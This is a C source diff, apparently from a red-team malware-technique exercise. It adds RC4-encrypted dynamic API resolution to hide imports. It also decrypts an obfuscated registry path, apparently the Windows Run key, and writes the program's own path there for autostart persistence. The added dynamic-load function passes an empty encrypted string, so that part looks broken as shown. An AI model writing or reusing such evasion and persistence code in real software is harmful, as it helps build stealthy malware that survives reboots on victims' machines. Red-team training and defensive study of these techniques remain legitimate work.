@@ -21,17 +21,26 @@ int(_stdcall* MessageBoxAPI)(
     UINT   uType
     );
 
+int MessageBoxDynamicallyLoaded()
+{
+    unsigned char* enc_str = (unsigned char*)"";
+    int length = strlen((char*)enc_str);
+    MessageBoxAPI = (MSGBOXDEF)GetProcAddress(LoadLibrary("User32.dll"), (char*)RC4((char*)"1234", (unsigned char*)enc_str, length));
+    (*MessageBoxAPI)(0, "Hello Dynamic", "MART Agent", 0);
+    return 0;
+}
+
 
 
 int main(int argc, char* argv[])
 {   
     char Filename[MAX_PATH] = { 0 };
-    
     DWORD nLength = GetModuleFileName(NULL, Filename, MAX_PATH) + 1;
-    const char* EncryptedRegKey = "\x97\x8b\x82\x90\x93\x85\x96\x81\x98\x89\xad\xa7\xb6\xab\xb7\xab\xa2\xb0\x98\x93\xad\xaa\xa0\xab\xb3\xb7\x98\x87\xb1\xb6\xb6\xa1\xaa\xb0\x92\xa1\xb6\xb7\xad\xab\xaa\x98\x96\xb1\xaa";
     
+    const char* EncryptedRegKey = "\x97\x8b\x82\x90\x93\x85\x96\x81\x98\x89\xad\xa7\xb6\xab\xb7\xab\xa2\xb0\x98\x93\xad\xaa\xa0\xab\xb3\xb7\x98\x87\xb1\xb6\xb6\xa1\xaa\xb0\x92\xa1\xb6\xb7\xad\xab\xaa\x98\x96\xb1\xaa";
     char* DecryptedRegKey = (char*)RC4((char*)"RedTeam", (unsigned char*)EncryptedRegKey, strlen(EncryptedRegKey));
     printf("Decrypted Registry Key: %s", DecryptedRegKey);
+
     UpdateRegistry(HKEY_CURRENT_USER, DecryptedRegKey, (char*)"RedTeam", (char*)Filename, nLength, REG_SZ, false);
     return 0;
 
